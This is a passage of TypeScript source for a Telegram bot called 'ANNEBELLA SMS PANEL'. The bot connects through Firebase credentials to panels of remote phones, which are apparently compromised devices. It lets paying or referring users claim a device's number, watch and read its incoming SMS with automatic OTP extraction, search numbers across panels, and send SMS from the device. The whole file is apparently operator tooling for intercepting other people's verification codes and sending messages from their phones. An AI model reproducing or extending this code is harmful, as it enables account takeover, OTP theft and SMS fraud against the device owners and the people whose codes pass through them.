                `${divider()}\n\n` +
                `${em(E.phone, "")} <b>From:</b> <code>${latest.sender}</code>\n` +
                `${em(E.timer, "")} <b>Time:</b> ${latest.time || "—"}\n\n` +
                `${em(E.history, "")} <b>Message:</b>\n<code>${latest.text}</code>` +
                (otp ? `\n\n${em(E.key, "")} <b>OTP DETECTED: <code>${otp}</code></b>` : ""),
                { parse_mode: "HTML", reply_markup: watchMenuKeyboard() as any }
              );
            }
          } catch (err) {
            logger.error({ err }, "Watch SMS polling error");
          }
        }, 10000);

        watchIntervals.set(telegramId, intervalId);
        await db.update(botUsersTable).set({ state: "watching" }).where(eq(botUsersTable.id, user.id));
        return;
      }

      if (text === sct("STOP WATCH")) {
        const iv = watchIntervals.get(telegramId);
        if (iv) { clearInterval(iv); watchIntervals.delete(telegramId); watchLastSms.delete(telegramId); }
        await db.update(botUsersTable).set({ state: "number_menu" }).where(eq(botUsersTable.id, user.id));
        await send(
          chatId,
 `${em(E.stop, "")} <b>WATCH STOPPED.</b>`,
          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("SMS HISTORY")) {
        if (!user.assignedDeviceId || !user.assignedPanelId) {
          await send(chatId, "FIRST GET NUMBER DABAO.", { reply_markup: mainMenuKeyboard() as any });
          return;
        }
        const [panel] = await db.select().from(panelsTable).where(eq(panelsTable.id, user.assignedPanelId));
        if (!panel) {
          await send(chatId, "PANEL NOT FOUND.", { reply_markup: numberMenuKeyboard() as any });
          return;
        }
        const messages = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, user.assignedDeviceId);
        if (messages.length === 0) {
          await send(
            chatId,
 `${em(E.history, "")} <b>KOI SMS NAHI MILA.</b>\n\nAbhi tak is number pe koi SMS nahi aaya.`,
            { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
          );
          return;
        }
        // Show latest 5 messages with OTP extraction
        const top5 = messages.slice(0, 5);
        const lines = top5.map((m, i) => {
          const otp = m.text.match(/\b\d{4,8}\b/)?.[0];
          return (
            `<b>${i + 1}. ${m.sender}</b>\n` +
            `${em(E.timer, "")} ${m.time || "—"}\n` +
            `<code>${m.text.slice(0, 120)}</code>` +
            (otp ? `\n${em(E.key, "")} <b>OTP: <code>${otp}</code></b>` : "")
          );
        }).join(`\n${divider()}\n`);

        await send(
          chatId,
 `${em(E.history, "")} <b>SMS HISTORY</b> (${messages.length} total, showing 5 latest)\n${divider()}\n\n${lines}`,
          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("NUMBERS HISTORY")) {
        const histAll = loadNumbersHistory();
        const userHist = histAll[telegramId] || [];

        if (userHist.length === 0) {
          await send(
            chatId,
 `${em(E.phone, "")} <b>NUMBERS HISTORY</b>\n${divider()}\n\n` +
            `Abhi tak koi number generate nahi hua.\nPehle <b>GET NUMBER</b> dabao!`,
            { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
          );
          return;
        }

        // Show last 5
        const last5 = userHist.slice(0, 5);
        const histLines = last5.map((h, i) => {
          const ago = Math.floor((Date.now() - h.takenAt) / 60000);
          const agoStr = ago < 60 ? `${ago}m ago` : `${Math.floor(ago / 60)}h ago`;
          return (
            `<b>${i + 1}. ${h.phoneNumber}</b>\n` +
            `${em(E.profile, "")} ${h.deviceName}\n` +
            `${em(E.db, "")} ${h.panelName}\n` +
            `${em(E.timer, "")} ${agoStr}`
          );
        }).join(`\n${divider()}\n`);

        await send(
          chatId,
 `${em(E.phone, "")} <b>NUMBERS HISTORY</b> (${userHist.length} total)\n${divider()}\n\n${histLines}`,
          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("STATUS")) {
        const panels = await db.select().from(panelsTable);
        let totalOnline = 0, totalOffline = 0, totalDevices = 0;
        for (const panel of panels) {
          const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
          totalOnline  += devices.filter((d) => d.status).length;
          totalOffline += devices.filter((d) => !d.status).length;
          totalDevices += devices.length;
        }

        await send(
          chatId,
 `${em(E.check, "")} <b>STATUS REPORT</b>\n` +
          `${divider()}\n\n` +
          `${em(E.check, "")} <b>ALL PANELS — TOTAL</b>\n` +
          `${em(E.check, "")} <b>ONLINE</b> : ${totalOnline}\n` +
          `${em(E.offline, "")} <b>OFFLINE</b> : ${totalOffline}\n` +
          `${em(E.check, "")} <b>GRAND TOTAL</b> : ${totalDevices}\n\n` +
          `${em(E.refresh, "")} <b>LIVE DATA</b>`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("SEARCH NUMBER")) {
        const panels = await db.select().from(panelsTable);
        let totalOnline = 0;
        for (const panel of panels) {
          const devs = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
          totalOnline += devs.filter((d) => d.status).length;
        }
        await db.update(botUsersTable).set({ state: "search_number" }).where(eq(botUsersTable.id, user.id));
        await send(
          chatId,
 `${em(E.search, "")} <b>SEARCH NUMBER</b>\n` +
          `${divider()}\n\n` +
          `${em(E.globe, "")} ALL PANELS CONNECTED. CURRENTLY <b>${totalOnline}</b> ONLINE NUMBERS LOADED.\n\n` +
          `ENTER THE PHONE NUMBER YOU WANT TO SEARCH:\n` +
          `Example: <code>9876543210</code>\n\n` +
          `Tap <b>CANCEL</b> to go back.`,
          { parse_mode: "HTML", reply_markup: cancelKeyboard() as any }
        );
        return;
      }

      if (text === sct("REFER & EARN")) {
        const expiryStr = user.getNumberExpiresAt && user.getNumberExpiresAt > new Date()
          ? `${em(E.check, "")} ACTIVE — ${Math.max(0, Math.floor((user.getNumberExpiresAt.getTime() - Date.now()) / 60000))}m remaining`
          : `${em(E.expire, "")} EXPIRED`;

        const webStatus = user.webPanelExpiresAt && user.webPanelExpiresAt > new Date()
          ? `${em(E.check, "")} ACTIVE — ${Math.floor((user.webPanelExpiresAt.getTime() - Date.now()) / 3600000)}hr remaining`
          : `${em(E.lock, "")} LOCKED — ${10 - Math.min(user.referralCount, 10)} aur referrals (${user.referralCount}/10)`;

        const sendStatus = user.sendSmsUnlocked
          ? `${em(E.check, "")} UNLOCKED — ${user.smsCredits} credits`
          : `${em(E.lock, "")} LOCKED — ${10 - Math.min(user.referralCount, 10)} aur referrals (${user.referralCount}/10)`;

 const referralLink = `https://t.me/${BOT_USERNAME}?start=${user.referralCode}`;

        await send(
          chatId,
 `${em(E.coin, "")} <b>REFERRAL SYSTEM</b>\n` +
          `${divider()}\n\n` +
          `${em(E.link, "")} <b>AAPKA REFERRAL LINK:</b>\n` +
 `<code>${referralLink}</code>\n\n` +
          `${divider()}\n` +
          `${em(E.coin, "")} <b>TOTAL REFERRALS:</b> ${user.referralCount}\n\n` +
          `${em(E.lightning, "")} <b>GET NUMBER</b>\n${expiryStr}\n\n` +
          `${em(E.phone, "")} <b>SEND SMS</b>\n${sendStatus}\n\n` +
          `${em(E.panel, "")} <b>WEB PANEL</b>\n${webStatus}\n\n` +
          `${divider()}\n` +
          `${em(E.star, "")} <b>RULES:</b>\n` +
          `• 1ST REFERRAL = +12HR GET NUMBER\n` +
          `• HAR REFERRAL = +12HR (CUMULATIVE)\n` +
          `• 10 REFERRALS = SEND SMS UNLOCK + 500 CREDITS\n` +
          `• 10 REFERRALS = WEB PANEL UNLOCK + 24HR ACCESS`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("GIFT CARD")) {
        await db.update(botUsersTable).set({ state: "gift_card" }).where(eq(botUsersTable.id, user.id));
        await send(
          chatId,
 `${em(E.gift, "")} <b>GIFT CARD REDEEM</b>\n` +
          `${divider()}\n\n` +
          `Apna gift code send karein:\nExample: <code>GIFT-AB3X7K</code>\n\n` +
          `${em(E.check, "")} Valid code redeem karne pe aapko Get Number access milega.`,
          { parse_mode: "HTML", reply_markup: cancelKeyboard() as any }
        );
        return;
      }

      if (text === sct("WEB PANEL")) {
        if (user.referralCount < 10) {
          await send(
            chatId,
 `${em(E.lock, "")} <b>WEB PANEL — LOCKED!</b>\n\n` +
            `${em(E.star, "")} WEB UNLOCK KARNE KE LIYE <b>${10 - user.referralCount} REFERRALS AUR KARO!</b>\n\n` +
            `${em(E.coin, "")} AAPKE TOTAL REFERRALS: ${user.referralCount}\n` +
            `${em(E.link, "")} REFER KARO, EARN KARO!`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        const hasWebAccess = user.webPanelExpiresAt && user.webPanelExpiresAt > new Date();
        if (!hasWebAccess) {
          await send(
            chatId,
 `${em(E.expire, "")} <b>WEB PANEL — ACCESS EXPIRED!</b>\n\nWEB PANEL ACCESS KHATAM HO GAYA. REFER KARO TO EXTEND KARO.`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        const webUrl = process.env.REPLIT_DEV_DOMAIN
 ? `https://${process.env.REPLIT_DEV_DOMAIN}`
          : "https://your-domain.repl.co";

        await send(
          chatId,
 `${em(E.check, "")} <b>WEB PANEL ACCESS GRANTED!</b>\n\n` +
          `${em(E.link, "")} <a href="${webUrl}">CLICK HERE TO OPEN WEB PANEL</a>\n\n` +
          `${em(E.expire, "")} ACCESS EXPIRES: ${user.webPanelExpiresAt?.toLocaleString("en-IN")}`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("SEND SMS")) {
        if (!user.sendSmsUnlocked) {
          await send(
            chatId,
 `${em(E.lock, "")} <b>SEND SMS LOCKED</b>\n\n` +
            `SMS BHEJNE KE LIYE <b>10 REFERRALS</b> COMPLETE KARO.\n` +
            `ABHI TAK: ${user.referralCount}/10\n` +
            `${em(E.link, "")} REFER & EARN BUTTON SE LINK SHARE KARO.`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        if (user.smsCredits <= 0) {
          await send(
            chatId,
 `${em(E.buy, "")} <b>SEND SMS</b>\n\nAPAKE PAAS 0 SMS CREDITS HAIN.\nREFERRALS KARO TO CREDITS EARN KARO.`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        await send(
          chatId,
 `${em(E.phone, "")} <b>SEND SMS</b>\n` +
          `${divider()}\n\n` +
          `${em(E.credits, "")} AAPKE PAAS <b>${user.smsCredits}</b> SMS CREDITS HAIN.\n\n` +
          `FORMAT: <code>NUMBER|MESSAGE</code>\nEXAMPLE: <code>9876543210|Hello, test message</code>\n\n` +
          `TAP <b>CANCEL</b> TO GO BACK.`,
          { parse_mode: "HTML", reply_markup: cancelKeyboard() as any }
        );
        await db.update(botUsersTable).set({ state: "send_sms" }).where(eq(botUsersTable.id, user.id));
        return;
      }

      if (text === sct("PROFILE")) {
        const getNum = user.getNumberExpiresAt && user.getNumberExpiresAt > new Date()
 ? ` ACTIVE — ${Math.max(0, Math.floor((user.getNumberExpiresAt.getTime() - Date.now()) / 60000))}m`
 : ` EXPIRED`;

        const webPanel = user.webPanelExpiresAt && user.webPanelExpiresAt > new Date()
 ? ` ACTIVE`
 : ` LOCKED`;

        const sendSms = user.sendSmsUnlocked
 ? ` UNLOCKED`
 : ` LOCKED`;

        await send(
          chatId,
 `${em(E.profile, "")} <b>MY PROFILE</b>\n` +
          `${divider()}\n\n` +
          `${em(E.id, "")} <b>NAME</b>    : ${user.firstName}\n` +
          `${em(E.id, "")} <b>ID</b>      : ${user.telegramId}\n` +
          `${em(E.check, "")} <b>JOINED</b>  : ${user.createdAt?.toLocaleDateString("en-IN") || "N/A"}\n` +
          `${divider()}\n\n` +
          `${em(E.lightning, "")} <b>GET NUMBER</b> : ${getNum}\n` +
          `${em(E.panel, "")} <b>WEB PANEL</b>  : ${webPanel}\n` +
          `${em(E.phone, "")} <b>SEND SMS</b>   : ${sendSms}\n` +
          `${divider()}\n\n` +
          `${em(E.coin, "")} <b>REFERRALS</b> : ${user.referralCount}\n` +
          `${em(E.credits, "")} <b>CREDITS</b>   : ${user.smsCredits}`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("BUY CREDIT")) {
        await send(
          chatId,
 `${em(E.buy, "")} <b>BUY CREDIT</b>\n` +
          `${divider()}\n\n` +
          `${em(E.credits, "")} <b>PACKAGE SELECT KARO — UPI QR AUTO-GENERATE HOGA:</b>\n\n` +
          `${em(E.money, "")} 100 CREDITS — ₹49\n` +
          `${em(E.money, "")} 500 CREDITS — ₹199\n` +
          `${em(E.money, "")} 1000 CREDITS — ₹349\n` +
          `${em(E.money, "")} 5000 CREDITS — ₹999\n\n` +
          `${em(E.history, "")} QR SCAN KARO → PAY KARO → SCREENSHOT DEVELOPER KO BHEJO.`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [
                  { text: "100 CREDITS — ₹49",   callback_data: "buy_100" },
                  { text: "500 CREDITS — ₹199",  callback_data: "buy_500" },
                ],
                [
                  { text: "1000 CREDITS — ₹349", callback_data: "buy_1000" },
                  { text: "5000 CREDITS — ₹999", callback_data: "buy_5000" },
                ],
              ],
            },
          }
        );
        return;
      }

      if (text === sct("SUPPORT ( DEVELOPER )")) {
        await send(
          chatId,
 `${em(E.support, "")} <b>SUPPORT ( DEVELOPER )</b>\n` +
          `${divider()}\n\n` +
          `KISI BHI ISSUE KE LIYE DEVELOPER SE CONTACT KARO:\n\n` +
          `${em(E.link, "")} ${DEVELOPER}`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("BACK") || text === sct("CANCEL")) {
        const iv = watchIntervals.get(telegramId);
        if (iv) { clearInterval(iv); watchIntervals.delete(telegramId); watchLastSms.delete(telegramId); }
        await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
        await send(
          chatId,
 `${em(E.lightning, "")} <b>MAIN MENU</b>`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      // ── State-based text inputs ──────────────────────────────────────────

      if (user.state === "search_number") {
        const searchNum = text.replace(/\D/g, "");
        if (searchNum.length < 7) {
          await send(chatId, "Please enter a valid phone number (min 7 digits).");
          return;
        }

 await send(chatId, `${em(E.search, "")} <b>Searching...</b>`, { parse_mode: "HTML" });

        const panels = await db.select().from(panelsTable);
        let found = null;
        for (const panel of panels) {
          const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
          const match   = devices.find((d) => d.phoneNumber.replace(/\D/g, "").includes(searchNum));
          if (match) { found = match; break; }
        }

        if (found) {
          await send(
            chatId,
 `${em(E.check, "")} <b>NUMBER FOUND!</b>\n${divider()}\n\n` +
            `${em(E.phone, "")} <b>Phone:</b> ${found.phoneNumber}\n` +
            `${em(E.db, "")} <b>Panel:</b> ${found.panelName}\n` +
            `${em(E.battery, "")} <b>Battery:</b> ${found.battery}\n` +
            `${em(E.check, "")} <b>Status:</b> ${found.status ? "Online" : "Offline"}`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
        } else {
          await send(
            chatId,
 `${em(E.offline, "")} <b>Number ${text} not found in any panel.</b>`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
        }
        await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
        return;
      }

      if (user.state === "gift_card") {
        const code = text.toUpperCase().trim();
        const [card] = await db
          .select()
          .from(giftCardsTable)
          .where(and(eq(giftCardsTable.code, code)));

        if (!card) {
 await send(chatId, `${em(E.warn, "")} <b>INVALID GIFT CODE.</b> PLEASE TRY AGAIN.`, { parse_mode: "HTML" });
          return;
        }
        if (card.usedBy) {
 await send(chatId, `${em(E.warn, "")} <b>THIS CODE HAS ALREADY BEEN USED.</b>`, { parse_mode: "HTML" });
          return;
        }

        const value      = parseInt(card.value, 10);
        let updateData: Partial<{ getNumberExpiresAt: Date; smsCredits: number }> = {};

        if (card.type === "hours") {
          const now    = new Date();
          const base   = user.getNumberExpiresAt ? new Date(Math.max(user.getNumberExpiresAt.getTime(), now.getTime())) : now;
          updateData.getNumberExpiresAt = new Date(base.getTime() + value * 60 * 60 * 1000);
        } else if (card.type === "credits") {
          updateData.smsCredits = user.smsCredits + value;
        }

        await db.update(botUsersTable).set(updateData).where(eq(botUsersTable.id, user.id));
        await db.update(giftCardsTable).set({ usedBy: telegramId, usedAt: new Date() }).where(eq(giftCardsTable.id, card.id));

 const rewardMsg = card.type === "hours" ? `+${value} hours Get Number access` : `+${value} SMS credits`;
        await send(
          chatId,
 `${em(E.gift, "")} <b>Gift code redeemed successfully!</b>\n\n${em(E.check, "")} Reward: <b>${rewardMsg}</b>`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
        return;
      }

      if (user.state === "send_sms") {
        if (text.includes("|")) {
          const [num, ...parts] = text.split("|");
          const phoneNum = num.trim().replace(/\D/g, "");
          const message  = parts.join("|").trim();

          if (!phoneNum || !message) {
            await send(chatId, `${em(E.warn, "")} Invalid format. Use: <code>NUMBER|MESSAGE</code>`, { parse_mode: "HTML" });
            return;
          }

          if (!user.assignedDeviceId || !user.assignedPanelId) {
            await send(chatId, `${em(E.warn, "")} Pehle GET NUMBER dabao — koi device assign nahi hai.`, { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any });
            await db.update(botUsersTable).set({ state: "main_menu" }).where(eq(botUsersTable.id, user.id));
            return;
          }

          // Send via Firebase
          const [smsPanel] = await db.select().from(panelsTable).where(eq(panelsTable.id, user.assignedPanelId));

          await send(chatId, `${em(E.refresh, "")} <b>SMS BHEJ RAHA HOON...</b>`, { parse_mode: "HTML" });

          let smsOk = false;
          if (smsPanel) {
            smsOk = await sendSmsViaFirebase(
              smsPanel.firebaseUrl,
              smsPanel.secretKey,
              user.assignedDeviceId,
              phoneNum,
              message
            );
          }

          const newCredits = Math.max(0, user.smsCredits - 1);
          await db
            .update(botUsersTable)
            .set({ smsCredits: newCredits, state: "main_menu" })
            .where(eq(botUsersTable.id, user.id));

          if (smsOk) {
            await send(
              chatId,
 `${em(E.check, "")} <b>SMS SENT SUCCESSFULLY!</b>\n${divider()}\n\n` +
              `${em(E.phone, "")} <b>TO:</b> <code>${phoneNum}</code>\n` +
              `${em(E.history, "")} <b>MESSAGE:</b> ${message}\n\n` +
              `${em(E.credits, "")} CREDITS REMAINING: ${newCredits}`,
              { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
            );
          } else {
            await send(
              chatId,
 `${em(E.warn, "")} <b>SMS SEND FAILED!</b>\n\nDevice se connection nahi hua. Ensure karo device online hai.\n` +
              `${em(E.credits, "")} Credit deduct nahi hua — balance: ${user.smsCredits}`,
              { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
            );
            // Restore credits since send failed
            await db.update(botUsersTable).set({ smsCredits: user.smsCredits }).where(eq(botUsersTable.id, user.id));
          }
          return;
        }
        await send(chatId, `${em(E.warn, "")} Format: <code>NUMBER|MESSAGE</code>\nExample: <code>9876543210|Hello test</code>`, { parse_mode: "HTML" });
        return;
      }

      // Default
      await send(
        chatId,
 `${em(E.lightning, "")} <b>MAIN MENU</b>`,
        { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
      );
    } catch (err) {
      logger.error({ err, chatId }, "Bot message handler error");
      try { await send(chatId, "Something went wrong. Please try again."); } catch {}
    }
  });

  // ── Callback query (inline buttons) ───────────────────────────────────────
  bot.on("callback_query", async (query) => {
    if (!query.message || !query.from) return;
    const chatId     = query.message.chat.id;
    const telegramId = String(query.from.id);
    const data       = query.data || "";

    // Always answer callback_query immediately to remove button loading state
    const safeAnswer = (text?: string) =>
      bot.answerCallbackQuery(query.id, text ? { text, show_alert: false } : {}).catch(() => {});

    try {
      if (data === "check_joined") {
        // Answer immediately so button loading clears — then do heavy check
        await safeAnswer("ᴄʜᴇᴄᴋɪɴɢ...");

        // Live membership check
        const joined    = await checkMembership(bot, telegramId);
        const joinCount = joined.filter(Boolean).length;
        const total     = REQUIRED_CHANNELS.length;
        const allJoined = joinCount === total;

        if (!allJoined) {

          // Edit the message to refresh join status — raw HTTP preserves icon_custom_emoji_id
          try {
            const editPayload = {
              chat_id:      chatId,
              message_id:   query.message.message_id,
              text: sc(
 `${em(E.lock, "")} <b>ᴄʜᴀɴɴᴇʟ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ʀᴇǫᴜɪʀᴇᴅ</b>\n${divider()}\n\n` +
            `ANNEBELLA SMS PANEL KA FULL ACCESS PANE KE LIYE\nNICHE DIYE GAYE SABHI OFFICIAL CHANNELS JOIN KARO.\n\n` +
            `${em(E.globe, "")} <b>ᴘʀᴏɢʀᴇꜱꜱ: ${joinCount}/${total} ᴊᴏɪɴᴇᴅ</b>\n\n` +
            `CHANNELS JOIN KARNE KE BAAD <b>ɪ ᴊᴏɪɴᴇᴅ — ᴄʜᴇᴄᴋ ɴᴏᴡ</b> BUTTON DABAO.`
              ),
              parse_mode:   "HTML",
              reply_markup: buildChannelKeyboard(joined, false),
            };
            const r = await rawTelegramRequest("editMessageText", editPayload);
            if (!r.ok) await rawTelegramRequest("editMessageText", stripKeyboardIcons(editPayload));
          } catch { /* message might not be editable */ }
          return;
        }

        // All joined — create/get user and open bot
        let [user] = await db.select().from(botUsersTable).where(eq(botUsersTable.telegramId, telegramId));
        if (!user) {
          const expiresAt = new Date(Date.now() + 60 * 60 * 1000);
          const [newUser] = await db.insert(botUsersTable).values({
            telegramId,
            username:           query.from.username || null,
            firstName:          query.from.first_name || "User",
            referralCode:       generateReferralCode(telegramId),
            referredBy:         null,
            getNumberExpiresAt: expiresAt,
          }).returning();
          user = newUser;
        }

        // Already answered with safeAnswer("ᴄʜᴇᴄᴋɪɴɢ...") above

        // Delete the force-join verification message — it's no longer needed
        try {
          await bot.deleteMessage(chatId, query.message.message_id);
        } catch { /* ignore if already deleted */ }

        await send(
          chatId,
 `${em(E.check, "")} <b>ᴀʟʟ ᴄʜᴀɴɴᴇʟꜱ ᴠᴇʀɪꜰɪᴇᴅ</b>\n${divider()}\n\n` +
          `ANNEBELLA SMS PANEL MEIN AAPKA SWAGAT HAI.\n` +
          `${em(E.rocket, "")} <b>ᴀᴄᴄᴇꜱꜱ ᴀʙ ᴜɴʟᴏᴄᴋ ʜᴀɪ.</b>`,
          { parse_mode: "HTML" }
        );

        await send(
          chatId,
 `${em(E.lightning, "")} <b>ʙᴏᴛ ʀᴇᴀᴅʏ! ᴜꜱᴇ ᴛʜᴇ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ.</b>`,
          { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
        );
        return;
      }

      if (data === "buy_100" || data === "buy_500" || data === "buy_1000" || data === "buy_5000") {
        const packages: Record<string, { credits: number; price: number }> = {
          buy_100:  { credits: 100,  price: 49 },
          buy_500:  { credits: 500,  price: 199 },
          buy_1000: { credits: 1000, price: 349 },
          buy_5000: { credits: 5000, price: 999 },
        };
        const pkg = packages[data];
 await bot.answerCallbackQuery(query.id, { text: `₹${pkg.price} ke liye UPI QR generate ho raha hai...` });
        await send(
          chatId,
 `${em(E.buy, "")} <b>PAYMENT DETAILS</b>\n${divider()}\n\n` +
          `${em(E.credits, "")} <b>PACKAGE:</b> ${pkg.credits} CREDITS\n` +
          `${em(E.money, "")} <b>AMOUNT:</b> ₹${pkg.price}\n\n` +
          `${em(E.warn, "")} UPI QR SCREENSHOT DEVELOPER KO BHEJO AFTER PAYMENT:\n` +
          `${em(E.link, "")} ${DEVELOPER}`,
          { parse_mode: "HTML" }
        );
        return;
      }

      if (data === "noop") {
        await safeAnswer();
        return;
      }

      // Fallback answer for any unhandled callback
      await safeAnswer();
    } catch (err) {
      logger.error({ err }, "Callback query error");
      await safeAnswer(); // always clear loading state even on error
    }
  });

  logger.info("Bot handlers set up");
}
